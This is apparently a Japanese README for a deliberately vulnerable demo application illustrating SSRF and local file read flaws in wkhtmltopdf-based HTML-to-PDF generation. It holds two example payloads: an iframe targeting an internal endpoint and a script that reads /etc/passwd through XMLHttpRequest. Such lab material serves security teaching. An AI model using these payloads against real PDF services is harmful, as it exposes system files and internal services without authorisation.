# HTML2PDF-vuln-demo
## 概要
HTMLをベースとするPDF生成処理に発生するSSRFやLFIの脆弱性に関するデモアプリケーション


## 起動方法
```bash
$ cd wkhtmltopdf
$ docker compose up
```

## URL
http://localhost:5000


## 攻撃ペイロード例

- SSRF
```html
<iframe src="http://localhost:5000/internal"></iframe>
```

- LFI
```html
<script>
xhr = new XMLHttpRequest();
xhr.open("GET", "file:///etc/passwd");
xhr.onload = function(){
    document.write(this.responseText)
};
xhr.send();
</script>
```
